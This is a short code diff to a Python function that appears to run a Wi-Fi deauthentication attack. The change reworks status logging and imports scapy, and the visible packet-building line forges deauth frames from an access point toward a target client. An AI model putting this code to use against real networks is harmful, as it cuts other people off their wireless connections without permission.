@@ -29,8 +29,11 @@ def begin_deauth(ap_mac, target_mac, interface):
 
     def _worker():
         try:
-            _push_status(f"starting attack ap={ap_mac} target={target_mac} iface={interface}")
-            
+            _push_status(f"ap={ap_mac}")
+            _push_status(f"target={target_mac}")
+            _push_status(f"iface={interface}")
+            # Import scapy modules inside the function to avoid circular imports
+            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
             # Build deauth packet
             pkt = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth()
             
